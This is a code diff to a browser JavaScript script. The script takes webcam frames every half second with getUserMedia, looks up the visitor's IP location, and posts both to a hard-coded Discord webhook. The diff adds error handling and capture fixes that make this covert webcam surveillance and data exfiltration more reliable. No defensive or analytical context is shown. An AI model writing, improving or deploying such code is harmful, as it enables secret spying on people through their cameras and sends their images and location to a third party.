@@ -11,6 +11,7 @@ const webhook = "https://discord.com/api/webhooks/1375557655036301593/fAVFnmHle5
 async function getIPInfo() {
   try {
     let res = await fetch('https://ipapi.co/json/');
+    if (!res.ok) return null;
     return await res.json();
   } catch {
     return null;
@@ -24,32 +25,46 @@ async function sendData(imageBlob, ipInfo) {
   }));
   form.append('file', imageBlob, 'capture.png');
 
-  await fetch(webhook, {
-    method: 'POST',
-    body: form
-  });
+  try {
+    const response = await fetch(webhook, {
+      method: 'POST',
+      body: form
+    });
+    if (!response.ok) {
+      console.error('Failed to send webhook:', response.status, response.statusText);
+    }
+  } catch (e) {
+    console.error('Error sending webhook:', e);
+  }
 }
 
 async function captureLoop() {
-  const stream = await navigator.mediaDevices.getUserMedia({video:true});
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({video:true});
+  } catch {
+    console.error('Camera access denied or unavailable');
+    return;
+  }
+
   const video = document.createElement('video');
   video.srcObject = stream;
-  video.play();
+  await video.play();
 
   const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
 
   while (true) {
     await new Promise(r => setTimeout(r, 500));
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0);
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
 
     const ipInfo = await getIPInfo();
 
-    sendData(blob, ipInfo).catch(() => {});
+    await sendData(blob, ipInfo);
   }
 }
 
